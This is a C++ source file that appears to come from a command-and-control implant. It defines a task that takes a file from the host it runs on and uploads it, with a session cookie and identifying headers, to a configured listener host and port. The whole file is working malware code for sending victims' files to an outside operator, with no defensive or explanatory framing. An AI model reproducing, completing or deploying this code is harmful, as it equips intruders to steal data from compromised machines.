#include "core/task.hpp"

namespace Task
{
    std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest)
    {        
        std::wstring wHeaders = L"";
        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
        wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
        wHeaders += L"X-FILE: " + wDest + L"\r\n";
        wHeaders += L"Cookie: session_id=" + pState->wSessionID + L"\r\n";

        BOOL bResult = System::Http::FileUpload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathUpload,
            wHeaders.c_str(),
            wSrc
        );
        if (!bResult)
        {
            return L"Error: Could not upload a file.";
        }

        return wDest.c_str();
    }
}